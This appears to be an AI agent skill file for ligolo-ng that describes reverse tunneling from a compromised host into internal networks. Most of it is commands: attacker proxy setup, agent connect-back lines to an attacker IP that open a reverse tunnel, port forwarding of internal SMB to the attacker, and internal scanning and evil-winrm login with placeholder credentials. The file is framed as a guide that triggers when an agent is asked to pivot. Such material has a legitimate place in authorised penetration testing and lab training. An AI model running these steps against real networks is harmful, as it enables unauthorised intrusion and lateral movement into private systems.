---
name: ligolo-ng
description: "Reverse tunneling tool that creates a TUN interface on the attacker machine to route traffic into internal networks via a compromised pivot host. Use when asked to pivot into an internal network, tunnel traffic through a compromised host, access internal subnets, or set up a network tunnel without SOCKS proxychains."
license: GPL-3.0
compatibility: "Linux (proxy), Linux/Windows/macOS (agent). Download prebuilt binaries from GitHub releases. Requires TUN interface support (root on Linux)."
metadata:
  author: AeonDave
  version: "1.0"
---

# ligolo-ng

Reverse tunneling via TUN interface — cleaner pivot than SOCKS/proxychains, works at network layer.

## Architecture

```
Attacker (proxy)  ←—TLS tunnel—  Victim pivot (agent)  ——→  Internal network
    [TUN iface]                   [compromised host]          192.168.1.0/24
```

No proxychains needed — all tools work natively against internal IP ranges.

## Quick Start

```bash
# Attacker: create TUN interface and start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Victim pivot host: connect agent to proxy
./agent -connect <attacker_ip>:11601 -ignore-cert

# Back on attacker proxy console:
session          # select the agent session
start            # start tunneling

# Add route to internal subnet via TUN interface
sudo ip route add 192.168.1.0/24 dev ligolo
```

## Proxy Commands (Console)

| Command | Description |
|---------|-------------|
| `session` | List / select active sessions |
| `start` | Start tunnel for selected session |
| `stop` | Stop tunnel |
| `ifconfig` | Show remote interfaces/subnets |
| `listener_add` | Add port forwarder (agent→proxy) |
| `listener_list` | List active listeners |
| `listener_stop` | Stop a listener |

## Port Forwarding (Listener)

To expose an internal service to the attacker:

```bash
# In proxy console (after selecting session):
listener_add --addr 0.0.0.0:4444 --to 192.168.1.5:445 --tcp
# Now target attacker:4444 → internal 192.168.1.5:445
```

## Common Workflows

```bash
# Full pivot setup
# Step 1: Start proxy (attacker)
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Step 2: Run agent on pivot (upload via web server or existing shell)
# Linux pivot:
./agent -connect 10.10.14.1:11601 -ignore-cert &
# Windows pivot:
agent.exe -connect 10.10.14.1:11601 -ignore-cert

# Step 3: Add route (attacker)
# In proxy console:
session          # ID: 1 - pivot-host
start
# In terminal:
sudo ip route add 10.200.1.0/24 dev ligolo

# Step 4: Use internal IPs directly
nmap -sS 10.200.1.0/24
nxc smb 10.200.1.0/24
evil-winrm -i 10.200.1.50 -u admin -p pass
```

## Double Pivot

For nested networks (attacker → pivot1 → pivot2 → internal):
- Run a second agent on pivot2 connecting back through pivot1 (via listener)
- Add a second TUN interface and route

## Resources

| File | When to load |
|------|--------------|
| `references/pivot-setup.md` | Double pivot, TLS certificate setup, agent persistence, Windows service install |

## Structuring This Skill
